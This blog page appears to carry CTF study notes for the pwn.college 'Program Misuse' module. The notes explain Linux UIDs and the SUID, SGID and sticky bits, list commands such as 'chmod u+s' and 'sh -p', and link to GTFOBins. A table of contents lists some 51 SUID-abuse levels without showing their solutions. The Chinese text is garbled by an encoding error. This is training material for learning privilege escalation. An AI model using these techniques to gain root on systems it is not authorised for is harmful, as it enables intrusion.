<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>pwnCollege1-ProgramMiuse | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"Npcå°ç«™","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="LectureNotes  Privilege Escalation  Every process has a user ID (UID) and and a group ID (GID)  UID 0: the Linux admin user (root). Needed for:  Installing software Loading device drivers Shutting do">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnCollege1-ProgramMiuse">
<meta property="og:url" content="http://npc0vo.github.io/2024/05/09/PwnCollege1-ProgramMiuse/index.html">
<meta property="og:site_name" content="Npc | Blog">
<meta property="og:description" content="LectureNotes  Privilege Escalation  Every process has a user ID (UID) and and a group ID (GID)  UID 0: the Linux admin user (root). Needed for:  Installing software Loading device drivers Shutting do">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-05-09T11:36:57.000Z">
<meta property="article:modified_time" content="2024-06-07T15:48:21.231Z">
<meta property="article:author" content="Npc">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">åˆæ´»äº†ä¸€å¤©</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">80</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/npc0vo" title="Yuque" target="_blank" style="color:#a0c69d"><span class="icon iconify" data-icon="ri:yuque-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lecturenotes"><span class="toc-number">1.</span> <span class="toc-text"> LectureNotes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#privilege-escalation"><span class="toc-number">1.1.</span> <span class="toc-text"> Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-permission-model"><span class="toc-number">1.1.1.</span> <span class="toc-text"> Linux Permission Model:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#useful-commands"><span class="toc-number">1.1.2.</span> <span class="toc-text"> Useful Commands:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sources"><span class="toc-number">1.2.</span> <span class="toc-text"> Sources:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fundamentals"><span class="toc-number">2.</span> <span class="toc-text"> Fundamentals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pragram-misuse"><span class="toc-number">2.1.</span> <span class="toc-text"> Pragram Misuse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1cat"><span class="toc-number">2.1.1.</span> <span class="toc-text"> level1(cat)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2more"><span class="toc-number">2.1.2.</span> <span class="toc-text"> level2(more)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3less"><span class="toc-number">2.1.3.</span> <span class="toc-text"> level3(less)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4tail"><span class="toc-number">2.1.4.</span> <span class="toc-text"> level4(tail)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5head"><span class="toc-number">2.1.5.</span> <span class="toc-text"> level5(head)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level6sort"><span class="toc-number">2.1.6.</span> <span class="toc-text"> level6(sort)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7vim"><span class="toc-number">2.1.7.</span> <span class="toc-text"> level7(vim)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8emacs"><span class="toc-number">2.1.8.</span> <span class="toc-text"> level8(emacs)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9nano"><span class="toc-number">2.1.9.</span> <span class="toc-text"> level9(nano)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10rev"><span class="toc-number">2.1.10.</span> <span class="toc-text"> level10(rev)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level11od"><span class="toc-number">2.1.11.</span> <span class="toc-text"> level11(od)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level12hexdump"><span class="toc-number">2.1.12.</span> <span class="toc-text"> level12(hexdump)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level13xxd"><span class="toc-number">2.1.13.</span> <span class="toc-text"> level13(xxd)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level14base32"><span class="toc-number">2.1.14.</span> <span class="toc-text"> level14(base32)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level15base64"><span class="toc-number">2.1.15.</span> <span class="toc-text"> level15(base64)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level16split"><span class="toc-number">2.1.16.</span> <span class="toc-text"> level16(split)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level17-gzip"><span class="toc-number">2.1.17.</span> <span class="toc-text"> level17 (gzip)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level18bzip2"><span class="toc-number">2.1.18.</span> <span class="toc-text"> level18(bzip2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level19zip"><span class="toc-number">2.1.19.</span> <span class="toc-text"> level19(zip)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level20tar"><span class="toc-number">2.1.20.</span> <span class="toc-text"> level20(tar)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level21ar"><span class="toc-number">2.1.21.</span> <span class="toc-text"> level21(ar)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.21.1.</span> <span class="toc-text"> è¯­æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.21.1.1.</span> <span class="toc-text"> å‚æ•°ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BF%85%E8%A6%81%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.21.1.2.</span> <span class="toc-text"> å¿…è¦å‚æ•°ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%89%E9%A1%B9%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.21.1.3.</span> <span class="toc-text"> é€‰é¡¹å‚æ•°ï¼š</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level22cpio"><span class="toc-number">2.1.22.</span> <span class="toc-text"> level22(cpio)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95-2"><span class="toc-number">2.1.22.1.</span> <span class="toc-text"> è¯­æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0-2"><span class="toc-number">2.1.22.1.1.</span> <span class="toc-text"> å‚æ•°ï¼š</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wp"><span class="toc-number">2.1.22.2.</span> <span class="toc-text"> wp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level23genisoimage"><span class="toc-number">2.1.23.</span> <span class="toc-text"> level23(genisoimage)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level24env"><span class="toc-number">2.1.24.</span> <span class="toc-text"> level24(env)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level25find"><span class="toc-number">2.1.25.</span> <span class="toc-text"> level25(find)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level26make"><span class="toc-number">2.1.26.</span> <span class="toc-text"> level26(make)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level27nice"><span class="toc-number">2.1.27.</span> <span class="toc-text"> level27(nice)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level28timeout"><span class="toc-number">2.1.28.</span> <span class="toc-text"> level28(timeout)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level29stdbuf"><span class="toc-number">2.1.29.</span> <span class="toc-text"> level29(stdbuf)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level30setarch"><span class="toc-number">2.1.30.</span> <span class="toc-text"> level30(setarch)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level31watch"><span class="toc-number">2.1.31.</span> <span class="toc-text"> level31(watch)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level32socat"><span class="toc-number">2.1.32.</span> <span class="toc-text"> level32(socat)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level33whiptail"><span class="toc-number">2.1.33.</span> <span class="toc-text"> level33(whiptail)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level34awk"><span class="toc-number">2.1.34.</span> <span class="toc-text"> level34(awk)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.34.1.</span> <span class="toc-text"> åŸºæœ¬è¯­æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%80%89%E9%A1%B9"><span class="toc-number">2.1.34.2.</span> <span class="toc-text"> å¸¸è§é€‰é¡¹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.34.3.</span> <span class="toc-text"> å¸¸è§ç”¨æ³•ç¤ºä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%8C%87%E5%AE%9A%E5%88%97"><span class="toc-number">2.1.34.3.1.</span> <span class="toc-text"> æ‰“å°æŒ‡å®šåˆ—ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%9D%A1%E4%BB%B6%E7%AD%9B%E9%80%89%E8%A1%8C"><span class="toc-number">2.1.34.3.2.</span> <span class="toc-text"> æ ¹æ®æ¡ä»¶ç­›é€‰è¡Œï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%9F%E8%AE%A1%E8%A1%8C%E6%95%B0"><span class="toc-number">2.1.34.3.3.</span> <span class="toc-text"> ç»Ÿè®¡è¡Œæ•°ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%88%97%E7%9A%84%E6%80%BB%E5%92%8C"><span class="toc-number">2.1.34.3.4.</span> <span class="toc-text"> è®¡ç®—åˆ—çš„æ€»å’Œï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%AD%97%E6%AE%B5%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">2.1.34.3.5.</span> <span class="toc-text"> æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-awk-%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.34.3.6.</span> <span class="toc-text"> ä½¿ç”¨ awk è„šæœ¬æ–‡ä»¶ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.34.3.7.</span> <span class="toc-text"> å®šä¹‰å˜é‡ï¼š</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level35sed"><span class="toc-number">2.1.35.</span> <span class="toc-text"> level35(sed)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level36ed"><span class="toc-number">2.1.36.</span> <span class="toc-text"> level36(ed)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level37chown"><span class="toc-number">2.1.37.</span> <span class="toc-text"> level37(chown)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level38chmod"><span class="toc-number">2.1.38.</span> <span class="toc-text"> level38(chmod)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level39cp"><span class="toc-number">2.1.39.</span> <span class="toc-text"> level39(cp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level40mv"><span class="toc-number">2.1.40.</span> <span class="toc-text"> level40(mv)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level41perl"><span class="toc-number">2.1.41.</span> <span class="toc-text"> level41(perl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level42python"><span class="toc-number">2.1.42.</span> <span class="toc-text"> level42(python)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level43ruby"><span class="toc-number">2.1.43.</span> <span class="toc-text"> level43(ruby)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level44bash"><span class="toc-number">2.1.44.</span> <span class="toc-text"> level44(bash)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level45date"><span class="toc-number">2.1.45.</span> <span class="toc-text"> level45(date)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level46dmesg"><span class="toc-number">2.1.46.</span> <span class="toc-text"> level46(dmesg)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level47wc"><span class="toc-number">2.1.47.</span> <span class="toc-text"> level47(wc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level48gcc"><span class="toc-number">2.1.48.</span> <span class="toc-text"> level48(gcc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level49as"><span class="toc-number">2.1.49.</span> <span class="toc-text"> level49(as)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level50wget"><span class="toc-number">2.1.50.</span> <span class="toc-text"> level50(wget)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.50.1.</span> <span class="toc-text"> å¸¸ç”¨å‘½ä»¤ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.50.2.</span> <span class="toc-text"> å¸¸ç”¨å‚æ•°ï¼š</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level51ssh-keygen"><span class="toc-number">2.1.51.</span> <span class="toc-text"> level51(ssh-keygen)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.52.</span> <span class="toc-text"> æ€»ç»“ï¼š</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/05/09/PwnCollege1-ProgramMiuse/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">pwnCollege1-ProgramMiuse</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-05-09 19:36:57" itemprop="dateCreated datePublished" datetime="2024-05-09T19:36:57+08:00">2024-05-09</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-06-07 23:48:21" itemprop="dateModified" datetime="2024-06-07T23:48:21+08:00">2024-06-07</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">15.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">64m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/PwnCollege/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">PwnCollege</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTF</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="lecturenotes"><a class="markdownIt-Anchor" href="#lecturenotes"></a> LectureNotes</h1>
<h2 id="privilege-escalation"><a class="markdownIt-Anchor" href="#privilege-escalation"></a> Privilege Escalation</h2>
<ul>
<li>Every process has a user ID (UID) and and a group ID (GID)
<ul>
<li>UID 0: the Linux admin user (root). Needed for:
<ul>
<li>Installing software</li>
<li>Loading device drivers</li>
<li>Shutting down/rebooting</li>
<li>Changing system-wide settings</li>
<li>Can be used to:
<ul>
<li>open ANY file</li>
<li>execute any program</li>
<li>assume any other user/group ID</li>
<li>debug any program</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="linux-permission-model"><a class="markdownIt-Anchor" href="#linux-permission-model"></a> <strong>Linux Permission Model:</strong></h3>
<p>447</p>
<ul>
<li>SUID(Set User ID): execute with the eUID(effective user ID) of the file owner rather than the parent process
<ul>
<li>Reset every time a fileâ€™s ownership is changed</li>
</ul>
</li>
<li>SGID(Set Group ID): execute with the eGID(effective Group ID) of the file owner rather than the parent process</li>
<li>Sticky: used for shared directories to limit file removal to file owners
<ul>
<li>ensures you can only delete files you have created in a shared directory</li>
</ul>
</li>
<li>Effective ID(eUID/eGID): the UID/GID used for most access checks</li>
<li>Read ID(UID/GID):the â€œrealâ€ user/group ID of the process owner, used for things such as signal checks</li>
<li>Saved ID: a user/group ID that your process could switch its eUID/eGID to
<ul>
<li>Used for temporarily dropping privileges</li>
</ul>
</li>
</ul>
<h3 id="useful-commands"><a class="markdownIt-Anchor" href="#useful-commands"></a> Useful Commands:</h3>
<ul>
<li><code>id</code>: will list out the IDs of every process on your system</li>
<li><code>sudo chmod u+s fileName</code>: add the SUID for the given file</li>
<li><code>sh -p</code>: ensures that privileges are not dropped when running a program</li>
</ul>
<h2 id="sources"><a class="markdownIt-Anchor" href="#sources"></a> Sources:</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://pwn.college/modules/misuse">pwn.college Module 2 Lectures</a></li>
<li><a target="_blank" rel="noopener" href="https://dojo.pwn.college/challenges/misuse">pwn.college Module 2 Challenges</a></li>
<li><a target="_blank" rel="noopener" href="https://www.twitch.tv/pwncollege">pwn.college Class Twitch Streams</a></li>
</ul>
<h1 id="fundamentals"><a class="markdownIt-Anchor" href="#fundamentals"></a> Fundamentals</h1>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">Linux å‘½ä»¤å¤§å…¨ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://gnu-linux.readthedocs.io/zh/latest/Chapter01/00_man.html">man æŸ¥çœ‹å¸®åŠ©æ‰‹å†Œ â€” Linux latest æ–‡æ¡£ (gnu-linux.readthedocs.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBinsè®°å½•äº†å¸¸è§linuxè½¯ä»¶çš„ææƒæ–¹å¼</a></p>
<p><code>å­¦å¥½Englishï¼Œèƒ½çœ‹æ‡‚manæ–‡æ¡£</code></p>
<p><s>çœ‹ä¸æ‡‚å•Š</s></p>
<h2 id="pragram-misuse"><a class="markdownIt-Anchor" href="#pragram-misuse"></a> Pragram Misuse</h2>
<p>This challenge is part of a series of programs that<br />
exposes you to very simple programs that let you directly read the flag.</p>
<p>â€œSUIDâ€ æŒ‡çš„æ˜¯ â€œSet User IDâ€ï¼Œæ˜¯ Unix å’Œç±» Unix ç³»ç»Ÿä¸Šçš„ä¸€ç§æƒé™ä½ã€‚å½“ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ‹¥æœ‰ SUID æƒé™æ—¶ï¼Œå½“ç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…çš„ç”¨æˆ· ID å°†ä¼šè¢«è®¾ç½®ä¸ºè¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· IDï¼Œè€Œä¸æ˜¯æ‰§è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·çš„ç”¨æˆ· IDã€‚è¿™ä½¿å¾—è¯¥è¿›ç¨‹ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ¥æ‰§è¡Œï¼Œè€Œä¸æ˜¯æ‰§è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·çš„æƒé™ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ™®é€šç”¨æˆ·åªèƒ½ä»¥è‡ªå·±çš„æƒé™æ‰§è¡Œç¨‹åºã€‚ä½†æ˜¯ï¼Œå½“ä¸€ä¸ªç¨‹åºæ‹¥æœ‰ SUID æƒé™æ—¶ï¼Œå³ä½¿æ˜¯æ™®é€šç”¨æˆ·æ‰§è¡Œè¯¥ç¨‹åºï¼Œå®ƒä¹Ÿä¼šä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ¥æ‰§è¡Œã€‚è¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚è®©æ™®é€šç”¨æˆ·æ‰§è¡ŒæŸäº›éœ€è¦ç‰¹æƒæƒé™çš„ä»»åŠ¡ï¼Œè€Œä¸éœ€è¦æš´éœ²ç³»ç»Ÿç®¡ç†å‘˜å¯†ç ã€‚</p>
